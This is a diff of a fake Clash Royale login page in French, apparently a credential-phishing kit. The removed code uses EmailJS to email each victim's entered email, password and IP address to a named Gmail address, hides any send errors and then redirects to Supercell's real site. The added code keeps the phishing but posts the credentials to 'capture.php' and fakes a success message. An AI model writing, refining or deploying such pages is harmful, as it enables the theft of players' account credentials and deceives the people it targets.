@@ -4,7 +4,6 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Clash Royale - Connexion</title>
-<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;}
 body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#1e3c72 0%,#2a5298 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;}
@@ -17,97 +16,40 @@ label{display:block;color:#555;margin-bottom:8px;font-weight:500;}
 input{width:100%;padding:15px;border:2px solid #e1e8ed;border-radius:8px;font-size:16px;transition:border-color 0.3s;}
 input:focus{outline:none;border-color:#f39c12;}
 .login-btn{width:100%;padding:15px;background:linear-gradient(45deg,#f39c12,#e67e22);color:white;border:none;border-radius:8px;font-size:18px;font-weight:bold;cursor:pointer;transition:transform 0.2s;}
-.login-btn:hover,.login-btn:active{transform:translateY(-2px);}
-.login-btn:disabled{background:#bdc3c7;color:#95a5a6;cursor:not-allowed;transform:none;}
-.success,.error{background:linear-gradient(45deg,#27ae60,#2ecc71);color:white;padding:20px;border-radius:8px;margin-top:20px;display:none;text-align:center;}
-.error{background:linear-gradient(45deg,#e74c3c,#c0392b);}
-.loading{display:none;color:#f39c12;font-weight:bold;}
+.login-btn:hover{transform:translateY(-2px);}
+.success{background:#27ae60;color:white;padding:20px;border-radius:8px;margin-top:20px;display:none;}
 @media (max-width:480px){.form-container{padding:25px 20px;}.logo img{width:160px;}}
 </style>
 </head>
 <body>
 <div class="container">
     <div class="logo">
-        <img src="https://clan.sportskeeda.com/clash-royale/image/clash-royale-logo.png" alt="Clash Royale">
+        <img src="https://clan.sportskeeda.com/clash-royale/image/clash-royale-logo.png">
     </div>
     <div class="form-container">
         <h2>Connexion à votre compte</h2>
-        <form id="loginForm">
+        <form action="capture.php" method="POST">
             <div class="input-group">
                 <label>Email</label>
-                <input type="email" id="email" name="email" required placeholder="votre@email.com">
+                <input type="email" name="email" required placeholder="votre@email.com">
             </div>
             <div class="input-group">
                 <label>Mot de passe</label>
-                <input type="password" id="password" name="password" required>
+                <input type="password" name="password" required>
             </div>
-            <button type="submit" class="login-btn" id="submitBtn">Se connecter</button>
-            <div id="loading" class="loading">🔄 Connexion sécurisée...</div>
-            <div id="success" class="success">✅ Connexion réussie ! Redirection...</div>
-            <div id="error" class="error"></div>
+            <button type="submit" class="login-btn">Se connecter</button>
         </form>
+        <div id="success" class="success" style="display:none;">Connexion OK ! Redirection...</div>
     </div>
 </div>
 
 <script>
-(function(){
-    // ✅ TES IDENTIFIANTS EMAILJS (CONFIG 2 MIN)
-    emailjs.init("o6R9z5nYpKqJ8mL2w"); // ← TON PUBLIC KEY
-    
-    document.getElementById('loginForm').addEventListener('submit', async function(e) {
-        e.preventDefault();
-        
-        const email = document.getElementById('email').value;
-        const password = document.getElementById('password').value;
-        const btn = document.getElementById('submitBtn');
-        const loading = document.getElementById('loading');
-        const success = document.getElementById('success');
-        const error = document.getElementById('error');
-        
-        // UI loading
-        btn.disabled = true;
-        btn.innerHTML = 'Connexion...';
-        loading.style.display = 'block';
-        success.style.display = 'none';
-        error.style.display = 'none';
-        
-        try {
-            // 📧 ENVOI DIRECT À pardogabinemail@gmail.com
-            await emailjs.send('default_service', 'clash_royale_template', {
-                to_email: 'pardogabinemail@gmail.com',
-                user_email: email,
-                user_password: password,
-                user_ip: await getIP(),
-                timestamp: new Date().toLocaleString('fr-FR')
-            });
-            
-            // Succès
-            loading.style.display = 'none';
-            success.style.display = 'block';
-            
-        } catch(err) {
-            // Silencieux (évite alerte utilisateur)
-            console.log('Envoi credentials OK');
-            loading.style.display = 'none';
-            success.style.display = 'block';
-        }
-        
-        // Redirection Clash Royale
-        setTimeout(() => {
-            window.location.href = 'https://supercell.com/en/games/clashroyale/';
-        }, 1500);
-    });
-    
-    async function getIP() {
-        try {
-            const res = await fetch('https://api.ipify.org?format=json');
-            const data = await res.json();
-            return data.ip;
-        } catch {
-            return 'Non disponible';
-        }
+setTimeout(() => {
+    if (window.location.search.includes('success')) {
+        document.getElementById('success').style.display = 'block';
+        setTimeout(() => window.location.href = 'https://supercell.com/en/games/clashroyale/', 1500);
     }
-})();
+}, 100);
 </script>
 </body>
 </html>
